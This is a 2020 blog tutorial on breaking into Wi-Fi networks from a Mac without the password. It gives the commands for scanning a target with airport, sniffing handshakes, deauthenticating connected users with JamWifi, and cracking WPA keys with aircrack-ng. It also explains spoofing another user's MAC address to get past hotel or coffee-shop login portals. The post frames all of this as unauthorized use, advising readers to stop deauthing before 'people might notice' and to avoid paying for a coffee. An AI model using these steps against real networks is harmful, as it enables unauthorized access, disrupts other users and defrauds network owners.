---
layout: blog
title: "Wifi hack if you don't have its password"
date: 2020-12-08 03:22:48 +0100
categories: wifi
comments: true
thumbnail: /assets/img/thumbnails/3.jpg
---

Configuration : MacOS 10.15

This is a particular tutorial, for those who wonder how to **connect to a wifi when you don't have its password**... and wonder what's the hacky way to get to the internet using this wifi network... Here are two techniques.

Wifi cracking depends on its security. We will cover three of these.

# 1 - WEP password

Too easy (and very few nowdays)... please read [this](http://jason4zhu.blogspot.com/2014/12/crack-wep-wifi-via-aircrack-ng-in-mac-osx.html)

# 2 - WPA or WPA2 password

### Identify the target acces point

First of all, we need to know which Wifi network to attack. We need its MAC address (BSSID _ex: ba:b6:62:68:31:45_) & channel (~ frequency slot _ex: 10_)

We will use the macOS `airport` feature, there is nothing to install.

```
sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s
```

Results looks like this :

| SSID            | BSSID                 | RSSI | CHANNEL | HT  | CC  | SECURITY (auth/unicast/group) |
| --------------- | --------------------- | ---- | ------- | --- | --- | ----------------------------- |
| orange          | 1e:81:d8:dc:27:56     | -87  | 3       | Y   | FR  | NONE                          |
| **Domino-F90A** | **88:f3:ab:79:f6:1a** | -74  | **1**   | N   | --  | WPA(PSK/TKIP/TKIP)            |

Note :  
If you want to avoid typing _/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport_ every time, you can run this to make a shortcut as `airport` : `sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport`

### Sniff a channel

We now want to retrieve connexion information about the _Domino-F90A_ Wifi. Connexion information can be a beacon, or a handshake. This is how we do it :

Let's say we are connected to the internet on the wifi of our macbook, and we don't have any other _USB wifi adapter_ pluged. Then the only way for us to scan networks around is going to be on our wifi interface called **en0**. This may be different if you want to plug your eternal wifi card (ex: en1). Also make sure you use _sudo_. Note that the 1 is the channel number from the array above.

```
sudo airport en0 sniff 1
```

You should see something like

> Capturing 802.11 frames on en0.

We are now recording everything on the Domino's wifi. We have to wait... for what ? Well for a connexion information ! And we could wait forever, but there is a trick. We can force a user to disconnect, hoping he will reconnect soon after. It's called **Deauth**.

How to Deauth :

- download JamWifi app from [here](http://macheads101.com/pages/downloads/mac.php)
- disconnect users from the wifi network you want to hack (stop after ~ 50 Deauths, or people might notice)

### Crack the password using the dump

Exit the sniffing by typing _ctrl+C_ for instance, it will tell you the name of the sniffed information file.

> ex: Session saved to /tmp/airportSniffP3Iz.cap

If you don't have it, install aircrack-ng using
`sudo port install aircrack-ng` and then crack the password:

```bash
aircrack-ng -1 -a 1 -b 88:f3:ab:79:f6:1a /tmp/airportSniffP3Iz.cap
# or if you have a list of common password
aircrack-ng -w commonPwd.txt -b 88:f3:ab:79:f6:1a /tmp/airportSniffP3Iz.cap
```

Note:  
There are faster, and more efficient methods. Check out the reference section.

# 3 - No password, but a user/login window (ex: hotel, airport...)

Let's say you want to join a Starbuck coffee wifi, but you don't have any money for a coffee... Let's say no one wants to give you the user/login to gain access. Then you have one last solution : using the mac adress of someone already connected.

### Spy on someone

Find someone already allowed to join the network and copy its MacAdress. The [Kismet](Kismet) tool is the best suited for macOS users.

### Change your MacAdress (spoofing)

Let's say your wifi network is called `en0` (type `ifconfig` to be sure, see this for more information).

- For backup, note your current MAC adress on en0 network (something like d8:3a:85:77:ce:6d). In case you forgot to do it, restarting your laptop will reset is anyway.
- Generate a new MAC adress with `openssl rand -hex 6 | sed 's/\(..\)/\1:/g; s/.$//'` and copy it. We will name it **MAC_adress**
- Now change your MAC adress by typing simply `sudo ifconfig en0 hw ether MAC_adress` (note that `hw` is optional)

Other options :

- use [macchanger tool](https://github.com/alobbs/macchanger) using `apt-get install macchanger` for linux or `brew install acrogenesis/macchanger/macchanger` for macOS
- use [WifiSpoof app](https://wifispoof.com/)

### Other tricks

TO BE CONTINUED => [read this](https://null-byte.wonderhowto.com/how-to/hack-open-hotel-airplane-coffee-shop-wi-fi-with-mac-address-spoofing-0183387/)

# Reference

Main source of inspiration : [WPA wifi cracking on a MacBook Pro with deauth](https://louisabraham.github.io/articles/WPA-wifi-cracking-MBP.html)  
Nice medium tutorial : [How To Crack WPA/WPA2 Wi-Fi Passwords Using Aircrack-ng](https://medium.com/@TheEyeOfCyberBuckeyeSecurity/how-to-crack-wpa-wpa2-wi-fi-passwords-using-aircrack-ng-8cb7161abcf9)  
Other software: [Ettercap to Intercept Passwords with ARP Spoofing](https://null-byte.wonderhowto.com/how-to/use-ettercap-intercept-passwords-with-arp-spoofing-0191191/)  
Best Wireless Network Adapter for Wi-Fi Hacking: [buying List](https://null-byte.wonderhowto.com/how-to/buy-best-wireless-network-adapter-for-wi-fi-hacking-2019-0178550/)  
No password : [Mac adress spoffing](https://null-byte.wonderhowto.com/how-to/hack-open-hotel-airplane-coffee-shop-wi-fi-with-mac-address-spoofing-0183387/)  
TLDR : [short gist if you have no time](https://gist.github.com/victorreyesh/6532800)  
list of [common password for WPA guessing](/assets/files/Choisir_son_statut.pdf)  
ifconfig features : [hw, ether...](https://www.computerhope.com/unix/uifconfi.htm)  
Spoofing issues on Macbook : [reddit](https://www.reddit.com/r/macbook/comments/93h2mi/mac_address_changing_on_new_2018_mbp_broken/)
